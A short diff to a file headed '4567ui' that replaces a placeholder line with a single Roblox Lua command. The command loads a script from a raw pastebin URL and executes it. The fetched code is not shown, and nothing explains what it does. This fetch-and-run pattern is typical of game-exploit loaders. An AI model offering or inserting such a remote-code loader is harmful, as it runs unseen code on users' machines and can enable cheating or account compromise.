@@ -1,2 +1,2 @@
 # 4567ui
-fggg
+loadstring(game:HttpGet("https://pastebin.com/raw/iA44f4jp"))()
